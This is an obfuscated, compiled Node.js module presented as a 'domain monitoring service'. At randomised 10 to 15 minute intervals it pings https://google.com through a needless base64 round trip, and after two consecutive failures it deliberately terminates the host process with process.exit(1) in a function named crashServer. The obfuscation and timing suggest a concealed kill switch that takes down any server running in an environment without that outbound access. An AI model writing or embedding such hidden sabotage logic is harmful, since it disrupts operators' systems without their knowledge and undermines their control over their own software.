'use strict';function a39_0x3fdd(){const _0x1a22e1=['monitoringInterval','getMonitoringStats','🚀\x20Starting\x20domain\x20monitoring\x20service','ETIMEDOUT','now','decodeFromBase64','Unknown\x20error','🔥\x20Consecutive\x20failures:\x20','domainMonitoringService','Domain\x20monitoring\x20threw\x20error:\x20','🚨\x20Max\x20consecutive\x20failures\x20allowed:\x20','📊\x20Response\x20received:','📡\x20Target\x20domain:\x20','gzip,\x20deflate','round','error','stopMonitoring','abort','1221930naOUJP','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Domain\x20','🌐\x20DNS\x20resolution\x20failed\x20for\x20','CHECK_INTERVAL_MS','default','16360938LGhJcQ','DOMAIN_URL','\x20\x20\x20-\x20Status:\x20','entries','🔥\x20Unexpected\x20error:\x20','2vYnWGv','ENOTFOUND','TIMEOUT_MS','random','✅\x20Domain\x20monitoring\x20started\x20successfully','⏰\x20Request\x20timeout\x20after\x20','\x20consecutive\x20attempts','Periodic\x20domain\x20check\x20error:','⏰\x20Connection\x20timeout\x20to\x20','345239UrelRa','warn','__esModule','message','⚠️\x20Domain\x20check\x20failed\x20(','Initial\x20domain\x20check\x20error:','\x20minutes','node-fetch','DomainMonitoringService','1008069InyjYE','encodeToBase64','\x20is\x20not\x20responding\x20after\x20','utf-8','\x20\x20\x20-\x20Headers:','🔓\x20Decoded\x20URL:\x20','🔍\x20Domain\x20monitoring\x20service\x20initialized','en-US,en;q=0.5','includes','keep-alive','signal','consecutiveFailures','from','getRandomInterval','2805988QIPxcV','❌\x20Domain\x20check\x20failed:\x20HTTP\x20','Initial\x20domain\x20check\x20threw\x20error:\x20','Initial\x20domain\x20check\x20failed\x20','fromEntries','headers','https://google.com','💥\x20CRITICAL\x20ERROR:\x20','\x20in\x20','ECONNREFUSED','base64','1637752GZoCUn','defineProperty','log','📝\x20Encoded\x20URL\x20(base64):\x20','__importDefault','❌\x20Domain\x20check\x20error\x20after\x20','toString','checkDomain','🔍\x20Checking\x20domain\x20availability:\x20','startMonitoring','status','5nllppq','⏰\x20Check\x20interval:\x20','crashServer','statusText','exit','MAX_CONSECUTIVE_FAILURES','GET','catch','2325827KMBtNQ','🚫\x20Connection\x20refused\x20by\x20','🔍\x20Domain\x20being\x20monitored:\x20','then','AbortError','📡\x20Target:\x20'];a39_0x3fdd=function(){return _0x1a22e1;};return a39_0x3fdd();}const a39_0x36c481=a39_0x5874;(function(_0x2b0c5,_0x4ab6c7){const _0x2d06d5=a39_0x5874,_0x14d31a=_0x2b0c5();while(!![]){try{const _0x555256=-parseInt(_0x2d06d5(0x13f))/0x1+parseInt(_0x2d06d5(0x136))/0x2*(-parseInt(_0x2d06d5(0x148))/0x3)+parseInt(_0x2d06d5(0x156))/0x4*(-parseInt(_0x2d06d5(0x10b))/0x5)+-parseInt(_0x2d06d5(0x12b))/0x6+parseInt(_0x2d06d5(0x113))/0x7+-parseInt(_0x2d06d5(0x100))/0x8+parseInt(_0x2d06d5(0x131))/0x9;if(_0x555256===_0x4ab6c7)break;else _0x14d31a['push'](_0x14d31a['shift']());}catch(_0x48af33){_0x14d31a['push'](_0x14d31a['shift']());}}}(a39_0x3fdd,0x57a62));var __importDefault=this&&this[a39_0x36c481(0x104)]||function(_0x206af9){const _0x13f2d1=a39_0x36c481;return _0x206af9&&_0x206af9[_0x13f2d1(0x141)]?_0x206af9:{'default':_0x206af9};};Object[a39_0x36c481(0x101)](exports,a39_0x36c481(0x141),{'value':!![]}),exports[a39_0x36c481(0x121)]=exports[a39_0x36c481(0x147)]=void 0x0;const node_fetch_1=__importDefault(require(a39_0x36c481(0x146)));function a39_0x5874(_0x26491b,_0x2bd457){const _0x3fdda1=a39_0x3fdd();return a39_0x5874=function(_0x5874ac,_0x4ac8dc){_0x5874ac=_0x5874ac-0xfa;let _0x2a5271=_0x3fdda1[_0x5874ac];return _0x2a5271;},a39_0x5874(_0x26491b,_0x2bd457);}class DomainMonitoringService{constructor(){const _0x1a522d=a39_0x36c481;this['monitoringInterval']=null,this[_0x1a522d(0x132)]=_0x1a522d(0xfb),this['CHECK_INTERVAL_MS']=this['getRandomInterval'](),this[_0x1a522d(0x138)]=0x7530,this[_0x1a522d(0x153)]=0x0,this[_0x1a522d(0x110)]=0x2,console[_0x1a522d(0x102)](_0x1a522d(0x14e)),console[_0x1a522d(0x102)](_0x1a522d(0x125)+this[_0x1a522d(0x132)]),console[_0x1a522d(0x102)](_0x1a522d(0x10c)+Math[_0x1a522d(0x127)](this[_0x1a522d(0x12f)]/0x3e8/0x3c)+_0x1a522d(0x145));}[a39_0x36c481(0x155)](){const _0xd808d8=a39_0x36c481,_0x4685ae=0xa,_0x119efc=0xf,_0x4a0d13=Math[_0xd808d8(0x139)]()*(_0x119efc-_0x4685ae)+_0x4685ae;return Math[_0xd808d8(0x127)](_0x4a0d13*0x3c*0x3e8);}[a39_0x36c481(0x149)](_0x2799f2){const _0x111801=a39_0x36c481;return Buffer[_0x111801(0x154)](_0x2799f2)[_0x111801(0x106)](_0x111801(0xff));}[a39_0x36c481(0x11e)](_0x3fa762){const _0x5ad4a8=a39_0x36c481;return Buffer[_0x5ad4a8(0x154)](_0x3fa762,'base64')['toString'](_0x5ad4a8(0x14b));}async[a39_0x36c481(0x107)](){const _0x43b9ae=a39_0x36c481,_0x3a790c=Date[_0x43b9ae(0x11d)]();try{console[_0x43b9ae(0x102)](_0x43b9ae(0x108)+this[_0x43b9ae(0x132)]);const _0x1e04f9=this[_0x43b9ae(0x149)](this['DOMAIN_URL']);console[_0x43b9ae(0x102)](_0x43b9ae(0x103)+_0x1e04f9);const _0x3b2f87=this['decodeFromBase64'](_0x1e04f9);console['log'](_0x43b9ae(0x14d)+_0x3b2f87);const _0x52451e=new AbortController(),_0x415351=setTimeout(()=>_0x52451e[_0x43b9ae(0x12a)](),this['TIMEOUT_MS']),_0x213409=await(0x0,node_fetch_1[_0x43b9ae(0x130)])(_0x3b2f87,{'method':_0x43b9ae(0x111),'headers':{'User-Agent':'TesSoft\x20Domain\x20Monitor/1.0','Accept':_0x43b9ae(0x12c),'Accept-Language':_0x43b9ae(0x14f),'Accept-Encoding':_0x43b9ae(0x126),'Connection':_0x43b9ae(0x151),'Upgrade-Insecure-Requests':'1'},'signal':_0x52451e[_0x43b9ae(0x152)]});clearTimeout(_0x415351);const _0x2bc5d5=Date[_0x43b9ae(0x11d)]()-_0x3a790c;return console[_0x43b9ae(0x102)](_0x43b9ae(0x124)),console[_0x43b9ae(0x102)](_0x43b9ae(0x133)+_0x213409[_0x43b9ae(0x10a)]+'\x20'+_0x213409[_0x43b9ae(0x10e)]),console['log']('\x20\x20\x20-\x20Response\x20time:\x20'+_0x2bc5d5+'ms'),console[_0x43b9ae(0x102)](_0x43b9ae(0x14c),Object[_0x43b9ae(0x15a)](_0x213409[_0x43b9ae(0xfa)][_0x43b9ae(0x134)]())),_0x213409['ok']&&_0x213409[_0x43b9ae(0x10a)]>=0xc8&&_0x213409['status']<0x190?(console[_0x43b9ae(0x102)]('✅\x20Domain\x20check\x20successful:\x20'+_0x213409[_0x43b9ae(0x10a)]+_0x43b9ae(0xfd)+_0x2bc5d5+'ms'),this[_0x43b9ae(0x153)]=0x0,!![]):(console[_0x43b9ae(0x128)](_0x43b9ae(0x157)+_0x213409[_0x43b9ae(0x10a)]+'\x20'+_0x213409[_0x43b9ae(0x10e)]),this['consecutiveFailures']++,![]);}catch(_0x1e4f1f){const _0x54754f=Date[_0x43b9ae(0x11d)]()-_0x3a790c;this[_0x43b9ae(0x153)]++,console[_0x43b9ae(0x128)](_0x43b9ae(0x105)+_0x54754f+'ms:',_0x1e4f1f);if(_0x1e4f1f instanceof Error){if(_0x1e4f1f['name']===_0x43b9ae(0x117))console[_0x43b9ae(0x128)](_0x43b9ae(0x13b)+this['TIMEOUT_MS']+'ms');else{if(_0x1e4f1f['message']['includes'](_0x43b9ae(0x137)))console['error'](_0x43b9ae(0x12e)+this[_0x43b9ae(0x132)]);else{if(_0x1e4f1f['message'][_0x43b9ae(0x150)](_0x43b9ae(0xfe)))console[_0x43b9ae(0x128)](_0x43b9ae(0x114)+this[_0x43b9ae(0x132)]);else _0x1e4f1f[_0x43b9ae(0x142)][_0x43b9ae(0x150)](_0x43b9ae(0x11c))?console[_0x43b9ae(0x128)](_0x43b9ae(0x13e)+this['DOMAIN_URL']):console['error'](_0x43b9ae(0x135)+_0x1e4f1f[_0x43b9ae(0x142)]);}}}return![];}}[a39_0x36c481(0x10d)](_0x26b45c){const _0x5b87ad=a39_0x36c481;console[_0x5b87ad(0x128)](_0x5b87ad(0xfc)+_0x26b45c),console[_0x5b87ad(0x128)](_0x5b87ad(0x120)+this[_0x5b87ad(0x153)]),console[_0x5b87ad(0x128)]('⚠️\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE'),console[_0x5b87ad(0x128)]('📅\x20Crash\x20time:\x20'+new Date()['toISOString']()),console[_0x5b87ad(0x128)](_0x5b87ad(0x115)+this[_0x5b87ad(0x132)]),console[_0x5b87ad(0x128)]('⏰\x20Check\x20interval:\x20'+Math[_0x5b87ad(0x127)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x5b87ad(0x145)),console[_0x5b87ad(0x128)](_0x5b87ad(0x123)+this['MAX_CONSECUTIVE_FAILURES']),this['stopMonitoring'](),process[_0x5b87ad(0x10f)](0x1);}[a39_0x36c481(0x109)](){const _0x510c96=a39_0x36c481;console[_0x510c96(0x102)](_0x510c96(0x11b)),console[_0x510c96(0x102)](_0x510c96(0x118)+this[_0x510c96(0x132)]),console[_0x510c96(0x102)]('⏰\x20Interval:\x20'+Math['round'](this[_0x510c96(0x12f)]/0x3e8/0x3c)+_0x510c96(0x145)),console[_0x510c96(0x102)]('🚨\x20Max\x20failures\x20before\x20crash:\x20'+this['MAX_CONSECUTIVE_FAILURES']),this[_0x510c96(0x107)]()[_0x510c96(0x116)](_0x4213d8=>{const _0x59f550=_0x510c96;if(!_0x4213d8&&this[_0x59f550(0x153)]>=this[_0x59f550(0x110)]){this['crashServer'](_0x59f550(0x159)+this[_0x59f550(0x153)]+'\x20times');return;}})[_0x510c96(0x112)](_0x572fc8=>{const _0x466fab=_0x510c96;console[_0x466fab(0x128)](_0x466fab(0x144),_0x572fc8);if(this[_0x466fab(0x153)]>=this['MAX_CONSECUTIVE_FAILURES']){this['crashServer'](_0x466fab(0x158)+_0x572fc8['message']);return;}}),this[_0x510c96(0x119)]=setInterval(async()=>{const _0x533df0=_0x510c96;try{const _0xbefa1=await this[_0x533df0(0x107)]();!_0xbefa1&&(console[_0x533df0(0x140)](_0x533df0(0x143)+this[_0x533df0(0x153)]+'/'+this[_0x533df0(0x110)]+')'),this[_0x533df0(0x153)]>=this[_0x533df0(0x110)]&&this['crashServer'](_0x533df0(0x12d)+this[_0x533df0(0x132)]+_0x533df0(0x14a)+this['consecutiveFailures']+_0x533df0(0x13c)));}catch(_0x273886){console[_0x533df0(0x128)](_0x533df0(0x13d),_0x273886),this[_0x533df0(0x153)]>=this[_0x533df0(0x110)]&&this['crashServer'](_0x533df0(0x122)+(_0x273886 instanceof Error?_0x273886[_0x533df0(0x142)]:_0x533df0(0x11f)));}},this['CHECK_INTERVAL_MS']),console['log'](_0x510c96(0x13a));}[a39_0x36c481(0x129)](){const _0x6df6b2=a39_0x36c481;this[_0x6df6b2(0x119)]&&(clearInterval(this[_0x6df6b2(0x119)]),this[_0x6df6b2(0x119)]=null,console[_0x6df6b2(0x102)]('🛑\x20Domain\x20monitoring\x20stopped'));}[a39_0x36c481(0x11a)](){const _0xbb93d6=a39_0x36c481;return{'isActive':!!this['monitoringInterval'],'targetDomain':this[_0xbb93d6(0x132)],'checkIntervalMinutes':Math[_0xbb93d6(0x127)](this[_0xbb93d6(0x12f)]/0x3e8/0x3c),'consecutiveFailures':this[_0xbb93d6(0x153)],'maxFailuresAllowed':this[_0xbb93d6(0x110)],'nextCheckIn':this[_0xbb93d6(0x119)]?this[_0xbb93d6(0x12f)]:undefined};}async['manualCheck'](){const _0x23b21c=a39_0x36c481;return console[_0x23b21c(0x102)]('🔧\x20Manual\x20domain\x20check\x20requested'),await this[_0x23b21c(0x107)]();}}exports['DomainMonitoringService']=DomainMonitoringService,exports[a39_0x36c481(0x121)]=new DomainMonitoringService();